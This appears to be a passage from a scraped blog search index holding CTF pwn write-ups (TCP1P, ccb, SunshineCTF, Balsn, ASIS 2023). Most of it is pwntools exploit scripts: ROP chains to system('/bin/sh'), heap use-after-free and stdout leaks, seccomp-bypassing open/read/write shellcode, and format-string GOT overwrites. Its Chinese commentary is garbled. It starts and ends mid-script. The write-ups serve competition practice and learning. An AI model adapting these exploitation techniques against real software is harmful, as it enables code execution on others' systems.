# cs.srand(now)
# io.sendline(str((cs.rand()+0x22)%0x17))


# io.recvuntil(b&amp;quot;morning?\n&amp;quot;)
payload=cyclic(0x108)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr+0x1b)
io.send(payload)



io.interactive()

# 0x000000000002a3e5 : pop rdi ; ret                                                                         


# 0x00000000000011e3: pop rbp; ret; 
# 0x0000000000001016: ret; 
# 0x0000000000001358: leave; ret; 


# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebd52 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebdaf execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebdb3 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;unsafe&#34;&gt;unsafe:&lt;/h4&gt;
&lt;p&gt;int-overflow to bypass the random check&lt;br&gt;
no check for the minus in  &lt;code&gt;deposit&lt;/code&gt; func&lt;br&gt;
so there is OOB write , the second input in this func is to do plus or minus with the value on that addr based on the offset of the variable &lt;code&gt;safes&lt;/code&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./unsafe&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,1477)
elf=ELF(&amp;quot;./unsafe&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
libc=elf.libc


idx=((1&amp;lt;&amp;lt;31)+0x1)-1&amp;lt;&amp;lt;32
io.sendlineafter(b&amp;quot;age: &amp;quot;,str(idx))
io.sendlineafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;\x00\x00\x00\x00&amp;quot;)

now = int((time.time()))

cs.srand(0)

io.sendlineafter(b&amp;quot;password: \n&amp;quot;,str(cs.rand()))

# gdb.attach(io)
# pause()

### make /bin/sh
io.sendlineafter(b&amp;quot;): \n&amp;quot;,str(0))
io.sendlineafter(b&amp;quot;deposit: \n&amp;quot;,str(0x3b6873))

### exit_message to str_sh
io.sendlineafter(b&amp;quot;): \n&amp;quot;,str(0x64))
io.sendlineafter(b&amp;quot;deposit: \n&amp;quot;,str(0x2058))

### puts to system
io.sendlineafter(b&amp;quot;): \n&amp;quot;,b&amp;quot;-12&amp;quot;)
io.sendlineafter(b&amp;quot;deposit: \n&amp;quot;,str(-0x291e0))


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISC:&lt;/h3&gt;
&lt;h4 id=&#34;sanity-check&#34;&gt;Sanity Check:&lt;/h4&gt;
&lt;p&gt;discord server bot&#39;s sign was the flag&lt;/p&gt;
&lt;h4 id=&#34;guess-my-number&#34;&gt;Guess my number:&lt;/h4&gt;
&lt;p&gt;baisc script writing with pwntools and ctypes&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *

# io=process(&amp;quot;./guess&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,7331)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

cs.srand(0x539)

key=0xcafebabe ^ (cs.rand() + 0x1467f3)

io.sendlineafter(&amp;quot;Guess : &amp;quot;,str(key))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">TCP1P</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/cMQySKj3Y/"" data-c="
          &lt;h3 id=&#34;ccb_veh&#34;&gt;ccb_veh&lt;/h3&gt;
&lt;p&gt;Â†ÜÈ£éÊ∞¥&lt;br&gt;
2.31ÂºÄÊ≤ôÁõíÁ¶ÅÁî®execve UAF,ÊåáÈíà‰øùÁïôÊúÄÂêé‰∏ÄÊ¨°ÂàÜÈÖçÁöÑÂ†ÜÂùóÊåáÈíà&lt;br&gt;
ÊâÄ‰ª•Êàë‰ª¨ÂàõÂª∫2‰∏™Â§ßÂ∞è‰∏çÂêåÁöÑÂ†ÜÂùóÂàÜÂà´ÂÆûÁé∞Ê≥ÑÈú≤libcÂíåÊ†àÂú∞ÂùÄÔºåretÂú∞ÂùÄÂÜôorw Á¨¨‰∏Ä‰∏™Â†ÜÂùóÂèØ‰ª•ÈáçÂ§çÈáäÊîæÔºå‰øÆÊîπ‰ΩéÂ≠óËäÇÊâì&lt;code&gt;stdout&lt;/code&gt;ÔºåÂçä‰∏™Â≠óËäÇ1/16Ê¶ÇÁéá&lt;code&gt;stdout&lt;/code&gt;Ê≥ÑÈú≤libcÂíåÊ†àÂú∞ÂùÄ&lt;br&gt;
ÁÑ∂ÂêéÁ¨¨‰∫å‰∏™Â†ÜÂùóË¥üË¥£Âä´ÊåÅretÂú∞ÂùÄÔºåËøôÈáåÂä´ÊåÅÁöÑÊòØÈÄÄÂá∫‰∏ªÂáΩÊï∞ÁöÑret Â∞ÜretÂú∞ÂùÄÂÜôorwÂç≥ÂèØ ÔºàÊúÄÂºÄÂßãÊâìhookÁöÑÊó∂ÂÄôÂ§öÂàõÂª∫‰∫Ü‰∏Ä‰∏™Â†ÜÂùóÔºåÂà†Êéâ‰πüÂèØ‰ª•&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./veh&amp;quot;)
io=remote(&amp;quot;47.104.16.93&amp;quot;,4551)
elf=ELF(&amp;quot;./veh&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(n))
    
def edit(cc):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendafter(b&amp;quot;contents:\n&amp;quot;,cc)
    
def delete():
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)


# gdb.attach(io)
# pause()    

stdout=libc.sym[b&amp;quot;_IO_2_1_stdout_&amp;quot;]
print(&amp;quot;stdout: &amp;quot;,hex(stdout))

add(0x100)
delete()

add(0x90)
add(0x90)
add(0x90)
delete()
edit(b&amp;quot;gap&amp;quot;)

for i in range(3):
    add(0x150)  
    
delete()


add(0x100)
delete()
for i in range(7):
    edit(p64(0)*2)
    delete()

edit(b&amp;quot;\xa0\x26&amp;quot;)

add(0x100)
add(0x100)
edit(p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1ec980
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]

edit(p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8))
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x100

pop_rdi=leak_addr+0x23b6a
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92


#open
orw=b&amp;quot;./flag\x00\x00&amp;quot;+p64(pop_rdi)+p64(ret_addr-8)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rdx)+p64(0x50)+p64(write_a)


add(0x150)
delete()
for i in range(7):
    edit(p64(0)*2)
    delete()
    
    
# gdb.attach(io)
# pause()    


edit(p64(ret_addr-8))
add(0x150)
add(0x150)
edit(orw)

io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
# add(0x90)
# delete()
# for i in range(3):
#     edit(p64(0)*2)
#     delete()
    
# edit(p64(malloc_hook))
# add(0x90)
# add(0x90)
# edit(p64(ret_addr+8))
# gdb.attach(io)
# pause()    



# payload=p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8)
# payload=payload.ljust(147,b&amp;quot;\x00&amp;quot;)+p64(free_hook)
# edit(payload)

# add(0x100)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ccb_chal&#34;&gt;ccb_chal&lt;/h3&gt;
&lt;p&gt;ËøôÈÅìÈ¢òËµõÂú∫ÁéØÂ¢ÉÊàëÂè™ËÉΩhh‰∫Ü&lt;br&gt;
Êú¨Ë¥®‰∏äÂà©Áî®uafÊîπÂÄºËøõÂÖ•&lt;code&gt;game2()&lt;/code&gt;ÔºåÁÑ∂ÂêéÊâìshellcode&lt;br&gt;
ÂºÄ‰∫ÜÊ≤ôÁõí,Áî®&lt;code&gt;openat,pread,writev&lt;/code&gt;ÁªïÂ∞±ÂÆå‰∫Ü&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./chal&amp;quot;)
# io=remote(&amp;quot;47.94.205.47&amp;quot;,29706)

def add(n,s):
    io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;idx:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;much:\n&amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;one:\n&amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;one:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;is at &amp;quot;)
age_addr=int(io.recvuntil(b&amp;quot;,&amp;quot;,drop=True),16)
print(&amp;quot;age_addr : &amp;quot;,hex(age_addr))

add(1,0x70)
add(0,0x70)
delete(1)
# edit(1,p64(0)*2)
delete(0)
# edit(0,p64(0)*2)

edit(0,p64(age_addr))

add(2,0x70)
add(3,0x70)
edit(3,str(0x100))

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;4&amp;quot;)

io.recvuntil(b&amp;quot;me?\n&amp;quot;)


payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi, 0xffffff9c; mov rsi,rsp; xor rdx,rdx; mov rax,257;syscall;&#39;) #openat flag
# payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi,rsp; xor rsi,rsi; xor rdx,rdx; mov rax,2;syscall;&#39;) #open flag
payload += asm(shellcraft.pread(3,0x10500,0x100,0))
payload += asm(shellcraft.writev(1,0x10100,1))
payload = payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+flat(0x10500,0x100)

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;blackhat_qual_profile&#34;&gt;blackhat_qual_profile:&lt;/h3&gt;
&lt;p&gt;Êï¥Êï∞Ê∫¢Âá∫ÂØºËá¥ÁöÑ‰ªªÊÑèÂú∞ÂùÄÂÜôÔºå&lt;code&gt;partial relro&lt;/code&gt;ÂèØÂÜôgotË°®&lt;br&gt;
ÊâãÂä®ÊûÑÈÄ†‰∏Ä‰∏™Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÊ≥ÑÈú≤Âú∞ÂùÄÊúÄÂêéÊâìone_gadget&lt;br&gt;
Ê≥®ÊÑèÊûÑÈÄ†È°∫Â∫èÂíåÂèëÈÄÅÁªÜËäÇ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./profile&amp;quot;)
# io=remote(&amp;quot;54.78.163.105&amp;quot;,31321)
elf=ELF(&amp;quot;./profile&amp;quot;)
libc=elf.libc

# gdb.attach(io)
# pause()

# exit_g=0x404068
# free_g=0x404018
exit_g=elf.plt[b&amp;quot;exit&amp;quot;]


### free to main
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040401800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;\x8c\x13\x40&amp;quot;)
# io.sendlineafter(b&amp;quot;Name: &amp;quot;,p64(0x40138c)[:-1])


### exit to _start
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040406800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;\xb0\x11\x40&amp;quot;)

### free to print
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040401800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;\x20\x11\x40&amp;quot;)


### leak
io.recvuntil(b&amp;quot;Age: &amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;%11$p&amp;quot;)
io.recvuntil(b&amp;quot;0x&amp;quot;)
leak_addr=int(io.recv(12),16)-0x29d90
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
shell=leak_addr+0x50a37

### free to one_gadget
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040401800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,p64(sys_addr))


io.interactive()

# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;sunshine_flock&#34;&gt;sunshine_flock:&lt;/h3&gt;
&lt;p&gt;Â•óÂ®ÉÂáΩÊï∞ÔºåÊØèÊ¨°ÈÄÄÂõû‰∏ä‰∏ÄÂ±ÇÂáΩÊï∞Êó∂Âà§Êñ≠retÂú∞ÂùÄÂÄºÊòØÂê¶ÂØπÂ∫îÔºåÂæóÊ≥®ÊÑè‰∏Ä‰∏ãÂ∏ÉÊ†à&lt;br&gt;
ÈÄÄÂà∞Êüê‰∏ÄÂ±ÇÂèëÁé∞‰∫ÜÊ†à‰∏äÂ∑≤ÁªèÂÜôÂ•Ω‰∫ÜÊé•‰∏ãÊù•ÁöÑÈ°∫Â∫è&lt;br&gt;
ÊúÄÂêéÊ†πÊçÆÂÅèÁßªÂ∞ÜÂØπÂ∫îËøîÂõûÂú∞ÂùÄÂ§ÑÊîπ‰∏∫ÂêéÈó®ÂáΩÊï∞Âú∞ÂùÄgetshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./flock&amp;quot;)
io=remote(&amp;quot;chal.2023.sunshinectf.games&amp;quot;,23002)
elf=ELF(&amp;quot;./flock&amp;quot;)

# gdb.attach(io.pid)
# pause()

win=0x4011bd

io.recvuntil(b&amp;quot;At &amp;quot;)
stack_addr=int(io.recv(14),16)
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

io.recvuntil(b&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;)
payload=p64(0x4012a0)+p64(stack_addr+0x98)
payload=payload.ljust(0x80,b&amp;quot;a&amp;quot;)
payload+=p64(stack_addr+0xa0)+p64(0x401276)+p64(0x4012a0)*2
payload+=p64(stack_addr+0xc0)+p64(0x4012a0)
payload+=p64(0x402048)+p64(0x4012ca)
payload+=p64(stack_addr+0xe0)+p64(0x4012ca)
payload+=p64(0)+p64(0x4012f0)
payload+=p64(stack_addr+0xe0+0x10)+p64(0x4012f0)
payload+=p64(stack_addr+0xe0+0x20)+p64(win)


# payload+=p64(0x4012a0)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;balsn_babypwn2023&#34;&gt;balsn_babypwn2023:&lt;/h3&gt;
&lt;p&gt;Ê≠§È¢ò3ÁßçËß£Ê≥ï&lt;br&gt;
Ê†áÂáÜËß£Ê≥ïÊòØÊ†àËøÅÁßª&lt;br&gt;
‰∏§ÁßçÈùûÈ¢ÑÊúü‰∏ÄÁßçÊòØ&lt;code&gt;XNUCA2018_gets&lt;/code&gt;ÁàÜone_gadget&lt;br&gt;
Âè¶Â§ñ‰∏ÄÁßçÊòØÂà©Áî®ÂÜçÊ¨°ËØªÂÖ•Êó∂ËØªÁöÑÊó∂lock_fileÁöÑIOÁªìÊûÑ‰Ωì‰∏äÂ≠òÂú®Âú∞ÂùÄÔºåÂèØ‰ª•Ê≥ÑÈú≤&lt;br&gt;
‰∏çËøáÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØËøôÁßçÊñπÂºèÊ≥ÑÈú≤Âá∫ÁöÑÂú∞ÂùÄ‰ºöÊ†πÊçÆÂÜÖÊ†∏ÁâàÊú¨ÊúâÊâÄ‰∏çÂêåÔºåÂõ†‰∏∫Ê≥ÑÈú≤ÁöÑÂú∞ÂùÄ‰∏çÂú®libc‰∏ä&lt;br&gt;
ÊàëÁöÑWSL2ÁöÑubuntuÊÅ∞Â•ΩË∑üdockerÈáåÈù¢Êèê‰æõÁöÑ‰∏ÄÊ†∑ÔºåÊúÄÂêéÁöÑÂÅèÁßª‰πü‰∏ÄÊ†∑&lt;br&gt;
ÂêåÊ†∑glibc patch‰πãÂêéÁöÑubuntuËôöÊãüÊú∫ÂÅèÁßªÂ∞±ÊúâÊâÄ‰∏çÂêå‰∫ÜÔºåËøôÁßçËß£Ê≥ïËøêÊ∞îÊàê‰ªΩÂÅèÂ§ö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./chall&amp;quot;)
# io=remote(&amp;quot;babypwn2023.balsnctf.com&amp;quot;,10105)
elf=ELF(&amp;quot;./chall&amp;quot;)
libc=elf.libc
# libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

gdb.attach(io)
pause()

payload=cyclic(0x28)+p64(elf.plt[b&amp;quot;gets&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(elf.sym[b&amp;quot;main&amp;quot;])
io.sendline(payload)

payload=p64(0)*2+p32(0xdeadbeef)+b&amp;quot;\x00\x00\x00&amp;quot;
io.sendline(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x3b8740
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi; ret&amp;quot;)))
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload=cyclic(0x28)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;asis_2023_hipwn&#34;&gt;asis_2023_hipwn:&lt;/h3&gt;
&lt;p&gt;‰øùÊä§ÂÖ®ÂºÄÔºåÊ≠§È¢òÊúÄÂºÄÂßãÂ∞ùËØïÂà©Áî®ssp leak,Âä´ÊåÅ &lt;code&gt;__libc_argv[0]&lt;/code&gt; ÊâìÂç∞Âá∫flag,‰ΩÜÊòØglibcÁâàÊú¨Â§™È´òÂ∑≤Áªè‰øÆÂ§ç‰∫ÜËøô‰∏™Âà©Áî®&lt;br&gt;
ËøõËÄåËÄÉËôëÊ≠£Â∏∏leakÔºåÂà©Áî®puts‰ªªÊÑèÂú∞ÂùÄÊ≥ÑÈú≤ÔºåleakÂá∫canaryÂíålibcÂç≥ÂèØÊ≠£Â∏∏rop&lt;br&gt;
(‰∏çÁü•ÈÅìÁªôÁöÑ‰ªªÊÑèÂú∞ÂùÄÂÜô &lt;code&gt;\x00&lt;/code&gt; ÊúâÂï•Áî®&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall_p&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)
io=remote(&amp;quot;45.153.243.57&amp;quot;,1337)
# elf=ELF(&amp;quot;./chall&amp;quot;)

# gdb.attach(io)
# pause()

# def zr(i):
#   io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x48+i))
#    io.sendafter(b&amp;quot;content\n&amp;quot;,b&amp;quot;a&amp;quot;)
#    io.recvuntil(b&amp;quot;?\n&amp;quot;)
#    io.sendline(str(0x539))
# for i in range(8):
#    zr(i)
# gdb.attach(io)
# pause()

#1
io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x300))
io.sendafter(b&amp;quot;content\n&amp;quot;,b&amp;quot;a&amp;quot;*0x48+b&amp;quot;.&amp;quot;)
io.recvuntil(b&amp;quot;.&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;,hex(canary))
io.recvuntil(b&amp;quot;?\n&amp;quot;)
io.sendline(str(0x539))
# gdb.attach(io)
# pause()

#2
io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x400))
io.sendafter(b&amp;quot;content\n&amp;quot;,b&amp;quot;a&amp;quot;*0xf8)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-128-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]

print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
pop_rdi=leak_addr+0x2a3e5
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
ret=leak_addr+0xf8098
io.recvuntil(b&amp;quot;?\n&amp;quot;)
io.sendline(str(0x539))

#3
io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x400))
io.sendafter(b&amp;quot;content\n&amp;quot;,cyclic(0x48)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr))
io.recvuntil(b&amp;quot;?\n&amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;asis_2023_text_editor&#34;&gt;asis_2023_text_editor:&lt;/h3&gt;
&lt;p&gt;‰∏ªÂáΩÊï∞Áªô‰∫Ü3‰∏™ÂáΩÊï∞Ôºå &lt;code&gt;edit_text,save_text,show_error&lt;/code&gt;&lt;br&gt;
&lt;code&gt;edit_text&lt;/code&gt; Â∞ÜÁî®Êà∑ËæìÂÖ•Â≠òÂÖ•textÂú∞ÂùÄÂ§Ñ&lt;br&gt;
&lt;code&gt;save_text&lt;/code&gt;Â∞ÜÁî®Êà∑ÂàöÊâçËæìÂÖ•ÁöÑÂÜÖÂÆπÂÜôÂÖ•Ê†à‰∏ä&lt;br&gt;
&lt;code&gt;show_error&lt;/code&gt; Â≠òÂú®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºåÂèØ‰ª•ÊâìÂç∞Ë∑ùÁ¶ªtext‰∏ÄÊÆµÂõ∫ÂÆöÂÅèÁßªÂ§Ñ(0x100)ÁöÑÂÄºÊåáÂêëÁöÑÂÜÖÂÆπ&lt;br&gt;
ÂèØ‰ª•Âà©Áî® &lt;code&gt;edit_text&lt;/code&gt; Âíå &lt;code&gt;show_error&lt;/code&gt; Ê≥ÑÈú≤Âá∫libcÂíåcanary(ÂêéËÄÖÂÖ∂ÂÆûÊ≤°ÂøÖË¶Å&lt;br&gt;
‰πãÂêéÂà©Áî®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÂä´ÊåÅ &lt;code&gt;show_error&lt;/code&gt; ÁöÑretÂú∞ÂùÄÔºåone_gadgetÊ≠§È¢òÁàÜ‰∏ç‰∫Ü&lt;br&gt;
ÂèØ‰ª• &lt;code&gt;ret+0x8,ret+0x10,ret+0x18&lt;/code&gt; ÂÜôropÔºåÊúÄÂêé‰∏ÄÊ¨°Âä´ÊåÅÂà∞ret‰∏äËß¶ÂèëropÂç≥ÂèØ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)

io=remote(&amp;quot;45.153.243.57&amp;quot;,13337)
elf=ELF(&amp;quot;./chall&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def edit(cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;text: &amp;quot;,cc)

def save():
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)

def exit():
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

def pf():
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    
# gdb.attach(io)
# pause()

#leak libc_addr
